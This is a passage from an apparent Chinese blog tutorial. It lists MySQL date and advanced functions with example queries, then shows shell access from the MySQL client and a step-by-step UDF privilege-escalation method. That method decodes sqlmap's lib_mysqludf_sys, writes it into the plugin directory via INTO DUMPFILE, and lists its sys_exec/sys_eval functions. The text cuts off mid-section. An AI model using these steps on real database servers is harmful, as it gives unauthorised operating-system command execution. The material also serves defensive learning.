转换为秒</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> SELECT TIME_TO_SEC(&#39;02:46:39&#39;);</span><br><span class="line">+-------------------------+</span><br><span class="line">| TIME_TO_SEC(&#39;02:46:39&#39;) |</span><br><span class="line">+-------------------------+</span><br><span class="line">|                    9999 |</span><br><span class="line">+-------------------------+</span><br></pre></td></tr></table></figure><p><strong>25.STR_TO_DATE(string, format_mask)</strong></p><p>将字符串转变为日期</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> SELECT STR_TO_DATE(&#39;November 11 2020&#39;, &#39;%M %d %Y&#39;);</span><br><span class="line">+---------------------------------------------+</span><br><span class="line">| STR_TO_DATE(&#39;November 11 2020&#39;, &#39;%M %d %Y&#39;) |</span><br><span class="line">+---------------------------------------------+</span><br><span class="line">| 2020-11-11                                  |</span><br><span class="line">+---------------------------------------------+</span><br></pre></td></tr></table></figure><p><strong>26.SUBDATE(d,n)</strong></p><p> 日期 d 减去 n 天后的日期</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> SELECT SUBDATE(&#39;2020-11-11 11:11:11&#39;, 366);</span><br><span class="line">+-------------------------------------+</span><br><span class="line">| SUBDATE(&#39;2020-11-11 11:11:11&#39;, 366) |</span><br><span class="line">+-------------------------------------+</span><br><span class="line">| 2019-11-11 11:11:11                 |</span><br><span class="line">+-------------------------------------+</span><br></pre></td></tr></table></figure><p><strong>27.SUBTIME(t,n)</strong></p><p>时间 t 减去 n 秒的时间</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> SELECT SUBTIME(&#39;2020-11-11 11:11:11&#39;, 11);</span><br><span class="line">+------------------------------------+</span><br><span class="line">| SUBTIME(&#39;2020-11-11 11:11:11&#39;, 11) |</span><br><span class="line">+------------------------------------+</span><br><span class="line">| 2020-11-11 11:11:00                |</span><br><span class="line">+------------------------------------+</span><br></pre></td></tr></table></figure><p><strong>28.TIME(expression)</strong></p><p>提取传入表达式的时间部分</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> SELECT TIME(&#39;2020-11-11 19:30:00&#39;);</span><br><span class="line">+-----------------------------+</span><br><span class="line">| TIME(&#39;2020-11-11 19:30:00&#39;) |</span><br><span class="line">+-----------------------------+</span><br><span class="line">| 19:30:00                    |</span><br><span class="line">+-----------------------------+</span><br></pre></td></tr></table></figure><p><strong>29.TIME_FORMAT(t,f)</strong></p><p>按表达式 f 的要求显示时间 t</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT TIME_FORMAT(&#39;11:11:11&#39;,&#39;%r&#39;);</span><br><span class="line">+------------------------------+</span><br><span class="line">| TIME_FORMAT(&#39;11:11:11&#39;,&#39;%r&#39;) |</span><br><span class="line">+------------------------------+</span><br><span class="line">| 11:11:11 AM                  |</span><br><span class="line">+------------------------------+</span><br></pre></td></tr></table></figure><p><strong>30.WEEK(d)</strong></p><p>计算日期 d 是本年的第几个星期，范围是 0 到 53</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> SELECT WEEK(&#39;2020-11-11 11:11:11&#39;);</span><br><span class="line">+-----------------------------+</span><br><span class="line">| WEEK(&#39;2020-11-11 11:11:11&#39;) |</span><br><span class="line">+-----------------------------+</span><br><span class="line">|                          45 |</span><br><span class="line">+-----------------------------+</span><br></pre></td></tr></table></figure><h2 id="MySQL-高级函数"><a href="#MySQL-高级函数" class="headerlink" title="MySQL 高级函数"></a>MySQL 高级函数</h2><p><strong>1.BIN(x)  |  OCT(x)  |  HEX(x)</strong></p><p>返回 x 的二进制编码|八进制编码|十六进制编码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT BIN(10);</span><br><span class="line">+---------+</span><br><span class="line">| BIN(10) |</span><br><span class="line">+---------+</span><br><span class="line">| 1010    |</span><br><span class="line">+---------+</span><br></pre></td></tr></table></figure><p><strong>2.BINARY(s)</strong></p><p> 将字符串 s 转换为二进制字符串</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> SELECT BINARY &#39;MySQL&#39;;</span><br><span class="line">+--------------------------------+</span><br><span class="line">| BINARY &#39;MySQL&#39;                 |</span><br><span class="line">+--------------------------------+</span><br><span class="line">| 0x4D7953514C                   |</span><br><span class="line">+--------------------------------+</span><br></pre></td></tr></table></figure><p><strong>3.条件判断函数</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">CASE expression</span><br><span class="line">    WHEN condition1 THEN result1</span><br><span class="line">    WHEN condition2 THEN result2</span><br><span class="line">   ...</span><br><span class="line">    WHEN conditionN THEN resultN</span><br><span class="line">    ELSE result</span><br><span class="line">END</span><br></pre></td></tr></table></figure><p>CASE 表示函数开始，END 表示函数结束。如果 condition1 成立，则返回 result1, 如果 condition2 成立，则返回 result2，当全部不成立则返回 result，而当有一个成立之后，后面的就不执行了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">SELECT CASE </span><br><span class="line">    -&gt; WHEN &#39;1 &gt; 0&#39; THEN &#39;1 &gt; 0&#39;</span><br><span class="line">    -&gt; WHEN &#39;2 &gt; 0&#39; THEN &#39;2 &gt; 0&#39;</span><br><span class="line">    -&gt; ELSE &#39;3 &gt; 0&#39;</span><br><span class="line">    -&gt; END;</span><br><span class="line">+----------------------------------------------------------------------------+</span><br><span class="line">| CASE </span><br><span class="line">WHEN &#39;1 &gt; 0&#39; THEN &#39;1 &gt; 0&#39;</span><br><span class="line">WHEN &#39;2 &gt; 0&#39; THEN &#39;2 &gt; 0&#39;</span><br><span class="line">ELSE &#39;3 &gt; 0&#39;</span><br><span class="line">END |</span><br><span class="line">+----------------------------------------------------------------------------+</span><br><span class="line">| 1 &gt; 0                                                                      |</span><br><span class="line">+----------------------------------------------------------------------------+</span><br></pre></td></tr></table></figure><p><strong>4.CAST(x AS type)</strong></p><p>转换数据类型</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> SELECT CAST(&quot;2020-11-11&quot; AS DATE);</span><br><span class="line">+----------------------------+</span><br><span class="line">| CAST(&quot;2020-11-11&quot; AS DATE) |</span><br><span class="line">+----------------------------+</span><br><span class="line">| 2020-11-11                 |</span><br><span class="line">+----------------------------+</span><br></pre></td></tr></table></figure><p><strong>5.COALESCE(expr1, expr2, …., expr_n)</strong></p><p>返回参数中的第一个非空表达式（从左向右）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT COALESCE(NULL,NULL,&#39;MySQL&#39;,NULL,&#39;Oracle&#39;,NULL);</span><br><span class="line">+------------------------------------------------+</span><br><span class="line">| COALESCE(NULL,NULL,&#39;MySQL&#39;,NULL,&#39;Oracle&#39;,NULL) |</span><br><span class="line">+------------------------------------------------+</span><br><span class="line">| MySQL                                          |</span><br><span class="line">+------------------------------------------------+</span><br></pre></td></tr></table></figure><p><strong>6.CONNECTION_ID()</strong></p><p>返回唯一的连接 ID</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT CONNECTION_ID();</span><br><span class="line">+-----------------+</span><br><span class="line">| CONNECTION_ID() |</span><br><span class="line">+-----------------+</span><br><span class="line">|              11 |</span><br><span class="line">+-----------------+</span><br></pre></td></tr></table></figure><p><strong>7.CONV(x,f1,f2)</strong></p><p> 返回 f1 进制数变成 f2 进制数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> SELECT CONV(10,10,2);</span><br><span class="line">+---------------+</span><br><span class="line">| CONV(10,10,2) |</span><br><span class="line">+---------------+</span><br><span class="line">| 1010          |</span><br><span class="line">+---------------+</span><br></pre></td></tr></table></figure><p><strong>8.CONVERT(s USING cs)</strong></p><p>函数将字符串 s 的字符集变成 cs</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">SELECT CHARSET(&#39;ABC&#39;);</span><br><span class="line">+----------------+</span><br><span class="line">| CHARSET(&#39;ABC&#39;) |</span><br><span class="line">+----------------+</span><br><span class="line">| utf8mb4        |</span><br><span class="line">+----------------+</span><br><span class="line">SELECT CHARSET(CONVERT(&#39;ABC&#39; USING gbk));</span><br><span class="line">+-----------------------------------+</span><br><span class="line">| CHARSET(CONVERT(&#39;ABC&#39; USING gbk)) |</span><br><span class="line">+-----------------------------------+</span><br><span class="line">| gbk                               |</span><br><span class="line">+-----------------------------------+</span><br></pre></td></tr></table></figure><p><strong>9.USER()  |CURRENT_USER()  |SESSION_USER()  |SYSTEM_USER()</strong></p><p>返回当前用户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> SELECT CURRENT_USER();</span><br><span class="line">+----------------+</span><br><span class="line">| CURRENT_USER() |</span><br><span class="line">+----------------+</span><br><span class="line">| root@%         |</span><br><span class="line">+----------------+</span><br></pre></td></tr></table></figure><p><strong>10.DATABASE()</strong></p><p>返回当前数据库名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT DATABASE();</span><br><span class="line">+------------+</span><br><span class="line">| DATABASE() |</span><br><span class="line">+------------+</span><br><span class="line">| mysql      |</span><br><span class="line">+------------+</span><br></pre></td></tr></table></figure><p><strong>11.IF(expr,v1,v2)</strong></p><p>如果表达式 expr 成立，返回结果 v1；否则，返回结果 v2</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT IF(1 &gt; 0,&#39;正确&#39;,&#39;错误&#39;);</span><br><span class="line">+-----------------------------+</span><br><span class="line">| IF(1 &gt; 0,&#39;正确&#39;,&#39;错误&#39;)     |</span><br><span class="line">+-----------------------------+</span><br><span class="line">| 正确                        |</span><br><span class="line">+-----------------------------+</span><br></pre></td></tr></table></figure><p><strong>12.IFNULL(v1,v2)</strong></p><p>如果 v1 的值不为 NULL，则返回 v1，否则返回 v2。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT IFNULL(null,&#39;Hello Word&#39;);</span><br><span class="line">+---------------------------+</span><br><span class="line">| IFNULL(null,&#39;Hello Word&#39;) |</span><br><span class="line">+---------------------------+</span><br><span class="line">| Hello Word                |</span><br><span class="line">+---------------------------+</span><br></pre></td></tr></table></figure><p><strong>13.ISNULL(expression)</strong></p><p>判断表达式是否为 NULL</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> SELECT ISNULL(NULL);</span><br><span class="line">+--------------+</span><br><span class="line">| ISNULL(NULL) |</span><br><span class="line">+--------------+</span><br><span class="line">|            1 |</span><br><span class="line">+--------------+</span><br></pre></td></tr></table></figure><p><strong>14.LAST_INSERT_ID()</strong></p><p>返回最近生成的 AUTO_INCREMENT 值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> SELECT LAST_INSERT_ID();</span><br><span class="line">+------------------+</span><br><span class="line">| LAST_INSERT_ID() |</span><br><span class="line">+------------------+</span><br><span class="line">|                0 |</span><br><span class="line">+------------------+</span><br></pre></td></tr></table></figure><p><strong>15.NULLIF(expr1, expr2)</strong></p><p>比较两个字符串，如果字符串 expr1 与 expr2 相等 返回 NULL，否则返回 expr1</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">SELECT NULLIF(25, 25);</span><br><span class="line">+----------------+</span><br><span class="line">| NULLIF(25, 25) |</span><br><span class="line">+----------------+</span><br><span class="line">|           NULL |</span><br><span class="line">+----------------+</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>16.VERSION()</strong></p><p>查看MySQL版本</p><p>返回数据库的版本号</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"> SELECT VERSION();</span><br><span class="line">+-------------------------+</span><br><span class="line">| VERSION()               |</span><br><span class="line">+-------------------------+</span><br><span class="line">| 8.0.22-0ubuntu0.20.04.2 |</span><br><span class="line">+-------------------------+</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>17.MD5()</strong></p><p>加密函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT MD5(&#39;123456&#39;);</span><br><span class="line">+----------------------------------+</span><br><span class="line">| MD5(&#39;123456&#39;)                    |</span><br><span class="line">+----------------------------------+</span><br><span class="line">| e10adc3949ba59abbe56e057f20f883e |</span><br><span class="line">+----------------------------------+</span><br></pre></td></tr></table></figure><p><strong>18.IP地址与数字相互转换的函数</strong></p><ul><li>INET_ATON(IP)</li></ul><p>IP地址转换为数字表示</p><ul><li>INET_NTOA(n)</li></ul><p>将数字n转换成IP形式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">SELECT INET_ATON(&#39;192.168.0.1&#39;);</span><br><span class="line">+--------------------------+</span><br><span class="line">| INET_ATON(&#39;192.168.0.1&#39;) |</span><br><span class="line">+--------------------------+</span><br><span class="line">|               3232235521 |</span><br><span class="line">+--------------------------+</span><br><span class="line">SELECT INET_NTOA(3232235521);</span><br><span class="line">+-----------------------+</span><br><span class="line">| INET_NTOA(3232235521) |</span><br><span class="line">+-----------------------+</span><br><span class="line">| 192.168.0.1           |</span><br><span class="line">+-----------------------+</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>19.加锁函数和解锁函数</strong></p><ul><li>GET_LOCK(name,time)函数定义一个名称为name、持续时间长度为time秒的锁。如果锁定成功，则返回1；如果尝试超时，则返回0；如果遇到错误，返回NULL。</li><li>RELEASE_LOCK(name)函数解除名称为name的锁。如果解锁成功，则返回1；如果尝试超时，返回0；如果解锁失败，返回NULL；</li><li>IS_FREE_LOCK(name)函数判断是否已使用名为name的锁定。如果使用，返回0，否则，返回1；</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">SELECT GET_LOCK(&#39;MySQL&#39;,10);</span><br><span class="line">+----------------------+</span><br><span class="line">| GET_LOCK(&#39;MySQL&#39;,10) |</span><br><span class="line">+----------------------+</span><br><span class="line">|                    1 |</span><br><span class="line">+----------------------+</span><br><span class="line">SELECT IS_FREE_LOCK(&#39;MySQL&#39;);</span><br><span class="line">+-----------------------+</span><br><span class="line">| IS_FREE_LOCK(&#39;MySQL&#39;) |</span><br><span class="line">+-----------------------+</span><br><span class="line">|                     0 |</span><br><span class="line">+-----------------------+</span><br><span class="line">SELECT RELEASE_LOCK(&#39;MySQL&#39;);</span><br><span class="line">+-----------------------+</span><br><span class="line">| RELEASE_LOCK(&#39;MySQL&#39;) |</span><br><span class="line">+-----------------------+</span><br><span class="line">|                     1 |</span><br><span class="line">+-----------------------+</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>20.@@datadir</strong>                                       数据库路径</p><p>​      <strong>@@version_compile_os</strong>               操作系统版本</p><p><strong>21.sleep(N)</strong></p><p>执行select sleep(N)可以让此语句运行N秒钟</p><p>前提条件: 指定条件的记录存在时才会停止指定的秒数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select sleep(1),database(),version(),user();</span><br><span class="line">+----------+------------+-------------------------+----------------+</span><br><span class="line">| sleep(1) | database() | version()               | user()         |</span><br><span class="line">+----------+------------+-------------------------+----------------+</span><br><span class="line">|        0 | test       | 8.0.22-0ubuntu0.20.04.2 | root@localhost |</span><br><span class="line">+----------+------------+-------------------------+----------------+</span><br><span class="line">1 row in set (1.00 sec)</span><br></pre></td></tr></table></figure><h1 id="MySQL-执行系统命令"><a href="#MySQL-执行系统命令" class="headerlink" title="MySQL 执行系统命令"></a>MySQL 执行系统命令</h1><p>在 MySQL 的命令行界面中可以使用 <code>system shell-cmd</code> 或者<code>\! shell-cmd</code> 格式执行 shell 命令。</p><p><strong>实例：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; system ls &#x2F;var&#x2F;www</span><br><span class="line">example.com  html</span><br><span class="line">mysql&gt; \! ls &#x2F;var&#x2F;www</span><br><span class="line">example.com  html</span><br></pre></td></tr></table></figure><p>也可以打开一个新的 shell，关闭 shell (使用 exit 或者 CTRL D)后返回 MySQL 命令行界面。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; \! bash</span><br><span class="line">root@linux:&#x2F;var&#x2F;www&#x2F;html&#x2F;project# cd ~</span><br><span class="line">root@linux:~# ls</span><br><span class="line">snap</span><br><span class="line">root@linux:~# exit</span><br><span class="line">exit</span><br><span class="line">mysql&gt; </span><br></pre></td></tr></table></figure><h1 id="UDF提权执行系统命令"><a href="#UDF提权执行系统命令" class="headerlink" title="UDF提权执行系统命令"></a>UDF提权执行系统命令</h1><blockquote><p>UDF 为 “User-Defined Function” 的所写，即用户自定义函数。MySQL 允许用户添加新的函数，其中一种方法就是通过其提供的 UDF 接口，添加用户自定义函数。用户自定义函数可以使用 C/C++ 语言编写并编译成库文件（其它语言也可以，只要能编译成共享库文件），放到 MySQL 指定的目录下，以便 MySQL 能动态加载用户自定义的函数。</p><p>使用 UDF 可以加载自定义的函数，因此可以通过自定义函数执行各种操作，关于用户自定义函数的编写可参考，<a href="https://docstore.mik.ua/orelly/weblinux2/mysql/ch14_01.htm">Extending MySQL</a></p></blockquote><h2 id="udf提权"><a href="#udf提权" class="headerlink" title="udf提权"></a>udf提权</h2><p><strong>1）原理</strong>：UDF提权是利用MySQL的自定义函数功能，构造特定的DLL将Mysql账号转化为系统system权限</p><p><strong>2）条件</strong></p><ul><li>MySQL 用户能写文件到 MySQL 指定的自定义函数库存放目录。</li><li>MySQL 用户具有 <code>INSERT</code> 权限，才能使用 <code>CREATE FUNCTION</code>语句在 MySQL 中添加自定义的函数，此外如果使用 <code>DROP FUNCTION</code> 语句删除自定义函数，还需要有 <code>DELETE</code> 权限。</li></ul><p>查看<code>secure_file_priv</code>的值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">show global variables like &#39;secure%&#39;;</span><br><span class="line">当secure_file_priv的值为NULL或&#x2F;tmp&#x2F;时，此时无法提权</span><br><span class="line">当secure_file_priv的值没有具体值时，则可以提权</span><br></pre></td></tr></table></figure><h2 id="udf文件"><a href="#udf文件" class="headerlink" title="udf文件"></a>udf文件</h2><p>对于udf文件，在sqlmap工具中自带就有，或<a href="https://github.com/rapid7/metasploit-framework/tree/master/data/exploits/mysql">github</a>里搜索，只要找对应操作系统的版本即可</p><p>查看系统架构</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like &#39;%compile%&#39;;         查看主机版本及架构</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201125173019139.png" alt="image-20201125173019139"></p><p>Windows下是.dll文件；linux下是.so文件</p><p>在 sqlmap\data\udf\mysql\windows|linux\64|32目录下存放着lib_mysqludf_sys.dll__|.so_</p><p>但是sqlmap 中 自带 的shell 以及一些二进制文件，为了防止被误杀都经过异或方式编码，不能直接使用,可以利用sqlmap 自带的解码工具cloak.py解码后，再直接利用。</p><p>进入到 sqlmap\extra\cloak 目录下，执行命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python clock.py -d -i &#x2F;usr&#x2F;share&#x2F;sqlmap&#x2F;data&#x2F;udf&#x2F;mysql&#x2F;linux&#x2F;64&#x2F;lib_mysqludf_sys.so_</span><br></pre></td></tr></table></figure><p>然后会生成一个lib_mysqludf_sys.so文件</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201125173442662.png" alt="image-20201125173442662"></p><h2 id="使用udf"><a href="#使用udf" class="headerlink" title="使用udf"></a>使用udf</h2><p><strong>1)将udf文件放到指定位置</strong></p><p>得到插件库路径</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like &quot;%plugin%&quot;;</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201125180437269.png" alt="image-20201125180437269"></p><p>得到udf文件的十六进制格式，可在本地通过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select hex(load_file(&#39;&#x2F;usr&#x2F;share&#x2F;sqlmap&#x2F;udf&#x2F;mysql&#x2F;linux&#x2F;64&#x2F;lib_mysqludf_sys.so&#39;)) into outfile &#39;&#x2F;tmp&#x2F;udf.txt&#39;;</span><br></pre></td></tr></table></figure><p>#windows下cmd命令行处理</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil -encodehex -f -v lib_mysqludf_sys.dll 1.txt 4</span><br></pre></td></tr></table></figure><p>写入插件库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &#39;7F454C46020...&#39; into dumpfile &#39;&#x2F;usr&#x2F;lib&#x2F;mysql&#x2F;plugin&#x2F;lib_mysqludf_sys.so&#39;;</span><br></pre></td></tr></table></figure><p><strong>2)从udf文件中引入自定义函数</strong></p><p>查看下这个udf库所支持的函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">root@linux:~# nm -D &#x2F;usr&#x2F;lib&#x2F;mysql&#x2F;plugin&#x2F;lib_mysqludf_sys.so</span><br><span class="line">         w _Jv_RegisterClasses</span><br><span class="line">0000000000201788 A __bss_start</span><br><span class="line">         w __cxa_finalize</span><br><span class="line">         w __gmon_start__</span><br><span class="line">0000000000201788 A _edata</span><br><span class="line">0000000000201798 A _end</span><br><span class="line">0000000000001178 T _fini</span><br><span class="line">0000000000000ba0 T _init</span><br><span class="line">         U fgets</span><br><span class="line">         U fork</span><br><span class="line">         U free</span><br><span class="line">         U getenv</span><br><span class="line">000000000000101a T lib_mysqludf_sys_info</span><br><span class="line">0000000000000da4 T lib_mysqludf_sys_info_deinit</span><br><span class="line">0000000000001047 T lib_mysqludf_sys_info_init</span><br><span class="line">         U malloc</span><br><span class="line">         U mmap</span><br><span class="line">         U pclose</span><br><span class="line">         U popen</span><br><span class="line">         U realloc</span><br><span class="line">         U setenv</span><br><span class="line">         U strcpy</span><br><span class="line">         U strncpy</span><br><span class="line">0000000000000dac T sys_bineval</span><br><span class="line">0000000000000dab T sys_bineval_deinit</span><br><span class="line">0000000000000da8 T sys_bineval_init</span><br><span class="line">0000000000000e46 T sys_eval</span><br><span class="line">0000000000000da7 T sys_eval_deinit</span><br><span class="line">0000000000000f2e T sys_eval_init</span><br><span class="line">0000000000001066 T sys_exec</span><br><span class="line">0000000000000da6 T sys_exec_deinit</span><br><span class="line">0000000000000f57 T sys_exec_init</span><br><span class="line">00000000000010f7 T sys_get</span><br><span class="line">0000000000000da5 T sys_get_deinit</span><br><span class="line">0000000000000fea T sys_get_init</span><br><span class="line">000000000000107a T sys_set</span><br><span class="line">00000000000010e8 T sys_set_deinit</span><br><span class="line">0000000000000f80 T sys_set_init</span><br><span class="line">         U sysconf</span><br><span class="line">         U system</span><br><span class="line">         U waitpid</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>创建函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td 